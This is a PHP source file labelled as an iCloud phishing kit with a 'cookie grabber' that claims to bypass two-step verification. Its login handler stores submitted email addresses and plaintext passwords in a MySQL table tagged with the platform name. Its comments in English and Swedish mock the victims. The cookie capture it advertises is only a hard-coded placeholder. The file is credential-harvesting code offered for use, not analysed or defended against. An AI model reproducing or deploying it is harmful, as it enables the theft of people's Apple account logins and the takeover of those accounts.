<?php 

# Phising iCloud # 
# Pass 2 step verification with Cookie grabber #


class Phising
{
    private static $host    = "localhost";
    private static $dbname  = "ricegang";
    private static $user    = "root";
    private static $pass    = "";
    private static $charset = "utf8";
    private static $platform = "iCloud";

    private static $dsn = "mysql:host=%s;dbname=%s;charset=%s";    // Dont touch it you twat
    private static $pdo, $statement;

    private static $logPath = "App\Logs";
    /**
     * __construct - Trying to reconnect to database if the current connection is empty.
     * 
     * @access public
     *
     * @return mixed Value.
     */
    public function __construct()
    {
        if(is_null(self::$pdo))
        {
            try
            {
                $attributes = [
                    PDO::ATTR_EMULATE_PREPARES => false,
                    PDO::ATTR_ERRMODE          => PDO::ERRMODE_EXCEPTION
                ];
                $dsn       = sprintf(self::$dsn, self::$host, self::$dbname, self::$charset);
                self::$pdo = new PDO($dsn, self::$user, self::$pass, $attributes);
            }
            catch (PDOException $e)
            {
                exit($e->getMessage());
            }
        }
    }
    
    public function login()
    {
        if(isset($_POST['submit'])) 
        {
            # CLicked on button, seemas interesting

            if(!empty($_POST['email'] && !empty($_POST['password'])))
            {
                # Ännu mer sus

                $Path = self::$logPath;

                $email = $_POST['email'];
                $password = $_POST['password'];
                $cookie_id = 'fdsfddfs';
                $platform = self::$platform;

                try
                {
                    $stmt = self::$pdo->prepare("INSERT INTO users (email, password, cookie_id, platform) VALUES(?,?,?,?)");
                    $stmt->execute([$email, $password, $cookie_id, $platform]);
                }
                catch(PDOException $e)
                {
                    return false;
                    echo "Error occured. See error: " . $e;
                }
            }
            else
            {
                # Låt han va
                return false;
            }
        }
    }
}

$Phising = new Phising();